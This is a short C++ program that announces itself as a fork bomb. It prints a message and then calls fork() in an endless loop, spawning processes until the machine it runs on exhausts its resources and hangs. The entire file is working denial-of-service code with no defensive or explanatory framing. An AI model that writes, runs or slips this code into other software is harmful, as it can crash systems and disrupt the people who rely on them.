#include <iostream>
#include <unistd.h>
#include <sys/types.h>

int main()
{
    std::cout << "Initiating fork bomb ...\n";
    while (true)
    {
        fork();
    }
    return 0;
}
